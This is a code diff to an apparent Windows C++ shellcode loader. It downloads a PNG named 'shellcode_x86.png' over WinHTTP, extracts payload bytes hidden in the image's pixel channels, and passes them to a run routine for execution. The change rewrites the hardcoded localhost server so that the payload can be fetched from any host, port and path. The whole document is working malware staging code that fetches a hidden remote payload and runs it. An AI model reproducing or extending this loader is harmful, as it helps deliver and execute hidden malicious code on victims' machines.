@@ -19,9 +19,28 @@ char* payload_data = new char[shellcode_len / 8];
 
 
 
-void read_image() {
+std::wstring parse_url(std::wstring* url, wchar_t delim) {
+    int pos = url->find_last_of(delim);
+    std::wstring res = url->substr(pos + 1, std::wstring::npos);
+    
+    *url = url->substr(0, pos);
+
+    return res;
+}
+
+Gdiplus::Bitmap* load_image(std::wstring url) {
     // get image from http server 
     HINTERNET hSession, hConnect, hRequest;
+
+
+    std::wstring file_path = L'/' + parse_url(&url, L'/');
+
+    int port = std::stoi(parse_url(&url, L':'));
+
+    std::wstring host = parse_url(&url, L'/');
+
+    int flag = (url == L"https:/") ? WINHTTP_FLAG_SECURE : 0;
+
 
     hSession = WinHttpOpen(
         L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
@@ -33,19 +52,19 @@ void read_image() {
 
     hConnect = WinHttpConnect(
         hSession,
-        L"127.0.0.1",
-        8000,
+        host.c_str(),
+        port,
         0
     );
 
     hRequest = WinHttpOpenRequest(
         hConnect,
         L"GET",
-        L"/shellcode_x86.png",
+        file_path.c_str(),
         NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
-        0
+        flag
     );
 
     WinHttpSendRequest(
@@ -97,17 +116,13 @@ void read_image() {
     CreateStreamOnHGlobal(img_buffer, FALSE, &img_stream);
 
 
-
-    // Init Gdiplus
-    GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR gdiplusToken;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
-
-
     // load image
     Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(img_stream);
 
+    return bmp;
+}
+
+void read_image(Gdiplus::Bitmap* bmp) {
     Color c;
     char channels[3];
 
@@ -134,10 +149,7 @@ void read_image() {
             }
         }
     }
-    GdiplusShutdown(gdiplusToken);
 }
-
-
 
 void run() {
     //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
@@ -153,9 +165,17 @@ void run() {
 
 
 int main() {
+    // Init Gdiplus
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    read_image();
+
+    Gdiplus::Bitmap* bmp = load_image(L"http://127.0.0.1:8080/shellcode_x86.png");
+    read_image(bmp);
     run();
+
+    GdiplusShutdown(gdiplusToken);
 
     return 0;
 }
